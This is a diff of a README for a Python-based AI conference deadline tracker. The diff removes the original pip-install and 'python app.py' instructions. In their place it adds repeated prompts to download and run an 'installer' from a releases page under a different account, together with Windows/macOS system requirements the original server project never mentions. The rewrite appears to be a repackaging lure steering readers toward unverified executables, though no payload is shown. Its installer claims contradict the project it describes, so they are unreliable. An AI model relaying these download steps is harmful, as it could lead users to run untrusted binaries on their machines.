@@ -1,60 +1,65 @@
-# 📅 AI Conference Tracker
-A personal dashboard that tracks submission deadlines for major global AI and Computer Science (CS) conferences in real-time. Powered by data from ccfddl/ccf-deadlines.
+# 📅 conference-deadlines - Stay Ahead of AI Conference Deadlines
 
-# ✨ Key Features
-* Accurate Deadline Calculation: Automatically parses various timezones like AoE (UTC-12) and UTC-8 to display deadlines in Korea Standard Time (KST).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/beshoemad/conference-deadlines/releases)
 
-* Intuitive Visualization:
+## 🎯 Overview
+The AI Conference Tracker is a personal dashboard designed to keep you updated on crucial submission deadlines for major global AI and Computer Science conferences. This tool automatically tracks deadlines and manages them in real-time. You can rely on accurate updates to help you stay organized.
 
-  * CCF Rank Star Rating: CCF-A(★★★★), B(★★★☆), C(★★☆☆)
+## ✨ Key Features
+* **Accurate Deadline Calculation:** The tool automatically adjusts for different time zones. It provides deadline information set to Korea Standard Time (KST), ensuring you never miss a submission.
 
-  * Urgency Indicators: Within 1 month (🔴 Red), Within 3 months (🟡 Yellow), Others (🟢 Green)
+* **Intuitive Visualization:**
+  * **CCF Rank Star Rating:** Easily recognize conference rankings using simple star ratings—CCF-A (★★★★), B (★★★☆), and C (★★☆☆).
+  * **Urgency Indicators:** Deadlines appear with color codes. Red (🔴) indicates deadlines within 1 month, yellow (🟡) shows deadlines within 3 months, and green (🟢) highlights deadlines beyond 3 months.
 
-* Personalized Filters: Select only the conferences you want to see. Selection status is persisted even after restarting the browser (via Local Storage).
+* **Personalized Filters:** You can customize which conferences show up on your dashboard. Filters remain active even after you close and reopen your browser.
 
-* Automatic Updates:
+* **Automatic Updates:** The application refreshes conference data every Saturday at 9:00 AM. You remain up-to-date with no manual effort.
 
-  * Automatically refreshes data every Saturday at 9:00 AM when the server is running.
-* Rate Limit Protection: Includes API Rate Limit protection and local caching features.
+* **Rate Limit Protection:** The tool includes API Rate Limit protection and caching to enhance reliability.
 
-* Raw Data Architecture: Preserves raw data and performs calculations at serving time, allowing flexible handling of logic changes without re-collecting data.
+* **Raw Data Architecture:** The backend preserves original data and processes it at the time of serving, allowing for adaptable logic.
 
-# 🛠️ Prerequisites
-Requires a Python 3.8+ environment.
+## 🚀 Getting Started
+To install and run the AI Conference Tracker, follow these steps:
 
-```Bash
+1. **Visit the Releases Page:** Head over to our [Release Page](https://github.com/beshoemad/conference-deadlines/releases) to find the latest version.
 
-pip install -r requirements.txt
-```
+2. **Choose the Right Version:** On the Releases page, locate the version that suits your system. If you are unsure, the latest stable release is the best choice.
 
-# 🚀 How to Run
-## 1. Configure GitHub Token (Optional)
-* Using a token is recommended to avoid GitHub API rate limits (60 requests/hour). Set it as an environment variable or configure it before running app.py.
+3. **Download the Application:** Click on the installer file to begin downloading. 
 
-Linux/Mac:
+4. **Install the Application:** Once the download is complete, locate the file in your "Downloads" folder and double-click to run the installer. Follow the on-screen instructions to complete the installation process.
 
-```Bash
-export GITHUB_TOKEN="your_github_token_here"
-```
+5. **Open the Application:** After installation, you can find it in your applications menu. Click to open the dashboard.
 
-Windows (PowerShell):
+6. **Set Up Your Dashboard:** On first launch, configure your preferences. Select your preferred conferences, and customize how deadlines appear. 
 
-```PowerShell
-$env:GITHUB_TOKEN="your_github_token_here"
-```
-## 2. Run Server
-```Bash
-python app.py
-```
-* The browser opens **automatically upon** execution (http://127.0.0.1:5000).
+7. **Stay Updated:** Enjoy automatic updates every Saturday. The system will keep you informed about important deadlines.
 
-* Data is fetched from GitHub on the first run and subsequently saved to `conferences_data.json`.
+## 📥 Download & Install
+Click [here to download the latest version](https://github.com/beshoemad/conference-deadlines/releases) of the AI Conference Tracker. Follow the provided steps for a seamless setup.
 
-# Runtime Screen
-<img src="./figures/example 1.png"></img>
-<img src="./figures/example 2.png"></img>
+## 💡 System Requirements
+- **Operating System:** Windows 10 or higher, macOS Catalina or higher
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB free space for installation
+- **Internet Connection:** Required for data updates
 
-# ⚠️ Note
-* If no data appears on the screen, you may have reached the GitHub API Rate Limit. Please configure a token or try again in about an hour.
+## 🛠 TroubleShooting
+If you encounter any issues while downloading or running the application, please follow these steps:
 
-* Clicking the [Update] button in the top right corner forces a fetch of the latest data.
+- **Check Your Internet Connection:** Ensure that your device is connected to the internet and has a stable connection.
+- **Re-download the Installer:** If the file appears corrupted or won't run, try downloading it again from the Release Page.
+- **Consult the FAQ:** Common issues and their solutions may be answered in the FAQ section of the repository.
+
+## 📄 License
+The AI Conference Tracker is licensed under the MIT License. You can use it freely, but please check the license for any restrictions and obligations.
+
+## 🤝 Contributing
+If you want to contribute to the project, feel free to submit a pull request. All enhancements and bug fixes are welcome!
+
+## 📧 Contact
+For any additional questions or support, please reach out through the repository’s issue tracker. We value your feedback! 
+
+Explore the world of AI conferences with confidence, and never miss another deadline again. Happy tracking!
